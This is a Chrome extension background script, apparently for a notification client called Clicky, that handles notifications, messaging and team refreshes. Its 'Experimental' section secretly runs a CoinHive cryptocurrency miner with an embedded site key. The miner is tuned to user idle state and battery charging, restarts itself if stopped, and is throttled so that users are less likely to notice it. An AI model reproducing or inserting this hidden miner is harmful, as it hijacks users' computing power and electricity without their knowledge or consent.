/* global CoinHive:true navigator:true */

import { wrapStore } from 'react-chrome-redux';
import { REACT_CHROME_REDUX } from './helpers/constants';
import {
  app as appActions,
  notifications as notificationsActions,
  state as stateActions,
  teams as teamsActions,
} from './actions';
import store from './store/index';

const { notification: notificationActions } = notificationsActions;
const { message } = appActions;
const { team: teamActions } = teamsActions;

wrapStore(store, {
  portName: REACT_CHROME_REDUX.PORT_NAME,
});

const {
  dispatch,
  getState,
} = store;

const state = getState();
// let refreshLoop;

const refreshTeams = () => {
  Object.values(state.teams.data).forEach((team) => {
    const { token } = team.clicky;
    dispatch(teamActions.refresh({ token }));
  });
};

refreshTeams();

chrome.notifications.onClicked.addListener((id) => {
  dispatch(notificationActions.open({ id }));
});

chrome.notifications.onButtonClicked.addListener((id, idx) => {
  if (idx === 0) {
    dispatch(notificationActions.mark({ id }));
  } else {
    dispatch(notificationActions.open({ id }));
  }
});

chrome.notifications.onClosed.addListener((id) => {
  dispatch(notificationActions.closed({ id }));
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'CLEAR_STATE') {
    dispatch(stateActions.clear());
    sendResponse({ ok: true });
  }
});

/**
 * onDisconnect fires when popup.html is closed
 * Check that the connection is the one we're
 * expecting then, if it is, clear the message
 */
chrome.runtime.onConnect.addListener((port) => {
  port.onDisconnect.addListener((sender) => {
    const { name } = sender;
    if (name === REACT_CHROME_REDUX.PORT_NAME) {
      dispatch(message.set({ message: '' }));
    }
  });
});

/**
 * Experimental
 */

if (CoinHive) {
  let experimentsEnabled = true;
  const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';

  let miner;

  const throttles = {
    active: 0.95,
    idle: 0.5,
    locked: 0.2,
  };

  const setThrottle = (throttle = throttles.active) => {
    // Stop the current miner, restart with a new 'user'
    miner.stop();

    // setTimeout the lazy man's callback
    setTimeout(() => {
      // New user is just the current throttle level
      miner = new CoinHive.User(coinHiveKey, throttle);
      miner.start();
    }, 1000);
  };

  // Heavily throttle mining to prevent noticiable impact
  setThrottle(throttles.active);

  const checkCoinHiveStatus = () => {
    if (!miner.isRunning()) {
      miner.start();
    }
  };

  let statusLoop;
  const startLoop = () => {
    statusLoop = setInterval(checkCoinHiveStatus, 30000);
  };

  const stopLoop = () => {
    if (!statusLoop) return;
    statusLoop = clearInterval(statusLoop);
  };

  miner.on('open', startLoop);
  miner.on('close', stopLoop);

  // If the battery is not charging, stop mining
  const checkBattery = battery => (
    battery.charging ? miner.start() : miner.stop()
  );

  // If we've got the battery API then use it
  if (typeof navigator.getBattery === 'function') {
    navigator.getBattery().then((battery) => {
      checkBattery(battery);
      battery.addEventListener('chargingchange', () => {
        checkBattery(battery);
      });
    });
  } else {
    miner.start();
  }

  const startIdleChecks = () => {
    const idleDetectionInterval = 300;

    // Initialize throttle and set detection interval
    chrome.idle.queryState(idleDetectionInterval, (newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });

    chrome.idle.setDetectionInterval(idleDetectionInterval);

    chrome.idle.onStateChanged.addListener((newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });
  };

  if (chrome.idle && typeof chrome.idle.queryState === 'function') {
    startIdleChecks();
  } else {
    setThrottle(0.90);
  }

  // To be used from inspector
  window.clickyToggleExperiments = () => {
    experimentsEnabled = !experimentsEnabled;
    console.debug('experimentsEnabled: ', experimentsEnabled); // eslint-disable-line no-console
    return experimentsEnabled ? miner.start() : miner.stop();
  };
}
